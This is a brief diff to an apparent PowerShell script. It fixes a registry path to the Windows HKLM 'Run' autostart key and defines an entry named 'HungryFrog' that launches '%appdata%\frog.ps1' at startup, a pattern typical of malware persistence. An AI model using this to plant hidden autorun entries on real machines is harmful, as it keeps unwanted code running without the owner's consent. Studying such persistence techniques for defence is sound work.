@@ -1,4 +1,4 @@
-$registryPath = 'HKEY_LOCAL_MACHINE\\SOFTWARE\Microsoft\\Windows\\CurrentVersion\\Run'
+$registryPath = 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
 $name = 'HungryFrog'
 $value = '%appdata%\\frog.ps1'
 
